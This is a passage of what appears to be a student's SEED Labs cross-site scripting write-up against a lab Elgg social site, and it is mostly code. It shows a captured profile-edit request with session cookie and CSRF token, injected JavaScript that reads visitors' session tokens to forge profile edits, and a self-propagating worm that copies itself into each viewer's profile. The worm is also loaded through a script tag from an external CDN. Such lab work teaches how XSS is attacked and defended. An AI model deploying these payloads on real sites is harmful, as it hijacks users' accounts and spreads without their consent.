accesslevel[description]=2
briefdescription=dasasda
accesslevel[briefdescription]=2
location
accesslevel[location]=2
interests
accesslevel[interests]=2
skills
accesslevel[skills]=2
contactemail
accesslevel[contactemail]=2
phone
accesslevel[phone]=2
mobile
accesslevel[mobile]=2
website
accesslevel[website]=2
twitter
accesslevel[twitter]=2
guid=44
POST /action/profile/edit HTTP/1.1
Host: www.xsslabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.xsslabelgg.com/profile/alice/edit
Content-Type: application/x-www-form-urlencoded
Content-Length: 505
Cookie: Elgg=ruji2rg6eu80rqj6oebqt57ga7
Connection: keep-alive
Upgrade-Insecure-Requests: 1
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="Request URL: http://www.xsslabelgg.com/action/profile/edit
__elgg_token=VSvHyrizEfLuFJUoNPOQXg
__elgg_ts=1589672946
name=Alice
description=<p>dsadsa</p>
accesslevel[description]=2
briefdescription=dasasda
accesslevel[briefdescription]=2
location
accesslevel[location]=2
interests
accesslevel[interests]=2
skills
accesslevel[skills]=2
contactemail
accesslevel[contactemail]=2
phone
accesslevel[phone]=2
mobile
accesslevel[mobile]=2
website
accesslevel[website]=2
twitter
accesslevel[twitter]=2
guid=44
POST /action/profile/edit HTTP/1.1
Host: www.xsslabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.xsslabelgg.com/profile/alice/edit
Content-Type: application/x-www-form-urlencoded
Content-Length: 505
Cookie: Elgg=ruji2rg6eu80rqj6oebqt57ga7
Connection: keep-alive
Upgrade-Insecure-Requests: 1
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Then edit Samy's profile and figure out his <code>guid</code> as 47</p>
<p>Screenshoot in cross-site-scripting Folder</p>
<p dir="auto">Now we want to modify the <code>about me</code> module in the profile of someone as <code>"modified by Samy"</code> if he/she visits Samy's profile page. Save the code below as Samy's profile:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span> <span class="pl-c1">type</span>="<span class="pl-s">text/javascript</span>"<span class="pl-kos">&gt;</span>
  <span class="pl-smi">window</span><span class="pl-kos">.</span><span class="pl-en">onload</span> <span class="pl-c1">=</span> <span class="pl-k">function</span> <span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-c">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts</span>
    <span class="pl-c">//and Security Token __elgg_token</span>
    <span class="pl-k">var</span> <span class="pl-s1">userName</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;name="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">session</span><span class="pl-kos">.</span><span class="pl-c1">user</span><span class="pl-kos">.</span><span class="pl-c1">name</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">guid</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;guid="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">session</span><span class="pl-kos">.</span><span class="pl-c1">user</span><span class="pl-kos">.</span><span class="pl-c1">guid</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">ts</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;__elgg_ts="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">security</span><span class="pl-kos">.</span><span class="pl-c1">token</span><span class="pl-kos">.</span><span class="pl-c1">__elgg_ts</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">token</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;__elgg_token="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">security</span><span class="pl-kos">.</span><span class="pl-c1">token</span><span class="pl-kos">.</span><span class="pl-c1">__elgg_token</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">description</span> <span class="pl-c1">=</span>
      <span class="pl-s">"&amp;description=&lt;p&gt;modified by Samy&lt;p&gt;"</span> <span class="pl-c1">+</span> <span class="pl-s">"&amp;accesslevel[description]=2"</span><span class="pl-kos">;</span>
    <span class="pl-c">//Construct the content of your url.</span>
    <span class="pl-k">var</span> <span class="pl-s1">sendurl</span> <span class="pl-c1">=</span> <span class="pl-s">"http://www.xsslabelgg.com/action/profile/edit"</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">content</span> <span class="pl-c1">=</span> <span class="pl-s1">userName</span> <span class="pl-c1">+</span> <span class="pl-s1">guid</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span> <span class="pl-c1">+</span> <span class="pl-s1">token</span> <span class="pl-c1">+</span> <span class="pl-s1">description</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">samyGuid</span> <span class="pl-c1">=</span> <span class="pl-c1">47</span><span class="pl-kos">;</span>
    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">session</span><span class="pl-kos">.</span><span class="pl-c1">user</span><span class="pl-kos">.</span><span class="pl-c1">guid</span> <span class="pl-c1">!=</span> <span class="pl-s1">samyGuid</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
      <span class="pl-c">//Create and send Ajax request to modify profile</span>
      <span class="pl-k">var</span> <span class="pl-v">Ajax</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"POST"</span><span class="pl-kos">,</span> <span class="pl-s1">sendurl</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Host"</span><span class="pl-kos">,</span> <span class="pl-s">"www.xsslabelgg.com"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span>
        <span class="pl-s">"Content-Type"</span><span class="pl-kos">,</span>
        <span class="pl-s">"application/x-www-form-urlencoded"</span>
      <span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-s1">content</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">}</span>
  <span class="pl-kos">}</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script type=&quot;text/javascript&quot;>
  window.onload = function () {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var userName = &quot;&amp;name=&quot; + elgg.session.user.name;
    var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;
    var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;
    var token = &quot;&amp;__elgg_token=&quot; + elgg.security.token.__elgg_token;
    var description =
      &quot;&amp;description=<p>modified by Samy<p>&quot; + &quot;&amp;accesslevel[description]=2&quot;;
    //Construct the content of your url.
    var sendurl = &quot;http://www.xsslabelgg.com/action/profile/edit&quot;;
    var content = userName + guid + ts + token + description;
    var samyGuid = 47;
    if (elgg.session.user.guid != samyGuid) {
      //Create and send Ajax request to modify profile
      var Ajax = null;
      Ajax = new XMLHttpRequest();
      Ajax.open(&quot;POST&quot;, sendurl, true);
      Ajax.setRequestHeader(&quot;Host&quot;, &quot;www.xsslabelgg.com&quot;);
      Ajax.setRequestHeader(
        &quot;Content-Type&quot;,
        &quot;application/x-www-form-urlencoded&quot;
      );
      Ajax.send(content);
    }
  };
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Then, visit Samy's profile using Boby's account. Boby's profile is modified at once:</p>
<p>Screenshoot in cross-site-scripting Folder</p>
<h1 dir="auto"><a id="user-content-task-6" class="anchor" aria-hidden="true" href="#task-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 6</h1>
<p dir="auto">To make the code in <a href="#task-5">Task 5</a> self-propogating:</p>
<h2 dir="auto"><a id="user-content-dom-approach" class="anchor" aria-hidden="true" href="#dom-approach"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>DOM Approach</h2>
<p dir="auto">Do some subtle modification based on the code in <a href="#task-5">Task 5</a>:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span> <span class="pl-c1">type</span>="<span class="pl-s">text/javascript</span>" <span class="pl-c1">id</span>="<span class="pl-s">worm</span>"<span class="pl-kos">&gt;</span>
  <span class="pl-smi">window</span><span class="pl-kos">.</span><span class="pl-en">onload</span> <span class="pl-c1">=</span> <span class="pl-k">function</span> <span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-k">var</span> <span class="pl-s1">headerTag</span> <span class="pl-c1">=</span> <span class="pl-s">'&lt;script id="worm" type="text/javascript"&gt;'</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">jsCode</span> <span class="pl-c1">=</span> <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">"worm"</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerHTML</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">tailTag</span> <span class="pl-c1">=</span> <span class="pl-s">"&lt;/"</span> <span class="pl-c1">+</span> <span class="pl-s">"script&gt;"</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">wormCode</span> <span class="pl-c1">=</span> <span class="pl-en">encodeURIComponent</span><span class="pl-kos">(</span><span class="pl-s1">headerTag</span> <span class="pl-c1">+</span> <span class="pl-s1">jsCode</span> <span class="pl-c1">+</span> <span class="pl-s1">tailTag</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-c">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts</span>
    <span class="pl-c">//and Security Token __elgg_token</span>

    <span class="pl-k">var</span> <span class="pl-s1">userName</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;name="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">session</span><span class="pl-kos">.</span><span class="pl-c1">user</span><span class="pl-kos">.</span><span class="pl-c1">name</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">guid</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;guid="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">session</span><span class="pl-kos">.</span><span class="pl-c1">user</span><span class="pl-kos">.</span><span class="pl-c1">guid</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">ts</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;__elgg_ts="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">security</span><span class="pl-kos">.</span><span class="pl-c1">token</span><span class="pl-kos">.</span><span class="pl-c1">__elgg_ts</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">token</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;__elgg_token="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">security</span><span class="pl-kos">.</span><span class="pl-c1">token</span><span class="pl-kos">.</span><span class="pl-c1">__elgg_token</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">description</span> <span class="pl-c1">=</span>
      <span class="pl-s">"&amp;description=&lt;p&gt;modified by Samy&lt;p&gt;"</span> <span class="pl-c1">+</span>
      <span class="pl-s1">wormCode</span> <span class="pl-c1">+</span>
      <span class="pl-s">"&amp;accesslevel[description]=2"</span><span class="pl-kos">;</span>
    <span class="pl-c">//Construct the content of your url.</span>
    <span class="pl-k">var</span> <span class="pl-s1">sendurl</span> <span class="pl-c1">=</span> <span class="pl-s">"http://www.xsslabelgg.com/action/profile/edit"</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">content</span> <span class="pl-c1">=</span> <span class="pl-s1">userName</span> <span class="pl-c1">+</span> <span class="pl-s1">guid</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span> <span class="pl-c1">+</span> <span class="pl-s1">token</span> <span class="pl-c1">+</span> <span class="pl-s1">description</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">samyGuid</span> <span class="pl-c1">=</span> <span class="pl-c1">47</span><span class="pl-kos">;</span>
    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">session</span><span class="pl-kos">.</span><span class="pl-c1">user</span><span class="pl-kos">.</span><span class="pl-c1">guid</span> <span class="pl-c1">!=</span> <span class="pl-s1">samyGuid</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
      <span class="pl-c">//Create and send Ajax request to modify profile</span>
      <span class="pl-k">var</span> <span class="pl-v">Ajax</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"POST"</span><span class="pl-kos">,</span> <span class="pl-s1">sendurl</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Host"</span><span class="pl-kos">,</span> <span class="pl-s">"www.xsslabelgg.com"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span>
        <span class="pl-s">"Content-Type"</span><span class="pl-kos">,</span>
        <span class="pl-s">"application/x-www-form-urlencoded"</span>
      <span class="pl-kos">)</span><span class="pl-kos">;</span>
      <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-s1">content</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-kos">}</span>
  <span class="pl-kos">}</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script type=&quot;text/javascript&quot; id=&quot;worm&quot;>
  window.onload = function () {
    var headerTag = '<script id=&quot;worm&quot; type=&quot;text/javascript&quot;>';
    var jsCode = document.getElementById(&quot;worm&quot;).innerHTML;
    var tailTag = &quot;</&quot; + &quot;script>&quot;;
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token

    var userName = &quot;&amp;name=&quot; + elgg.session.user.name;
    var guid = &quot;&amp;guid=&quot; + elgg.session.user.guid;
    var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;
    var token = &quot;&amp;__elgg_token=&quot; + elgg.security.token.__elgg_token;
    var description =
      &quot;&amp;description=<p>modified by Samy<p>&quot; +
      wormCode +
      &quot;&amp;accesslevel[description]=2&quot;;
    //Construct the content of your url.
    var sendurl = &quot;http://www.xsslabelgg.com/action/profile/edit&quot;;
    var content = userName + guid + ts + token + description;
    var samyGuid = 47;
    if (elgg.session.user.guid != samyGuid) {
      //Create and send Ajax request to modify profile
      var Ajax = null;
      Ajax = new XMLHttpRequest();
      Ajax.open(&quot;POST&quot;, sendurl, true);
      Ajax.setRequestHeader(&quot;Host&quot;, &quot;www.xsslabelgg.com&quot;);
      Ajax.setRequestHeader(
        &quot;Content-Type&quot;,
        &quot;application/x-www-form-urlencoded&quot;
      );
      Ajax.send(content);
    }
  };
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Edit Boby's profile as the code above. Then sign-in as Boby to view his profile page, as expected, Boby is injected and shows "modified by Samy". Log-out and then log-in as Alice to view Boby's profile, now you can found that Alice's profile is also changed.</p>
<h2 dir="auto"><a id="user-content-link-approach" class="anchor" aria-hidden="true" href="#link-approach"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Link Approach</h2>
<p dir="auto">Write the JavaScript file <a href="/li-xin-yi/seedlab/blob/master/Cross-Site-Scripting-Attack/xssworm.js"><code>xssworm.js</code></a> and store it in the external link <a href="https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab@latest/Cross-Site-Scripting-Attack/xssworm.js" rel="nofollow">https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab@latest/Cross-Site-Scripting-Attack/xssworm.js</a></p>
<p dir="auto">Add it into Samy's profile:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span>
  <span class="pl-c1">type</span>="<span class="pl-s">text/javascript</span>"
  <span class="pl-c1">src</span>="<span class="pl-s">https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab@latest/Cross-Site-Scripting-Attack/xssworm.js</span>"
<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script
  type=&quot;text/javascript&quot;
  src=&quot;https://cdn.jsdelivr.net/gh/li-xin-yi/seedlab@latest/Cross-Site-Scripting-Attack/xssworm.js&quot;
></script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
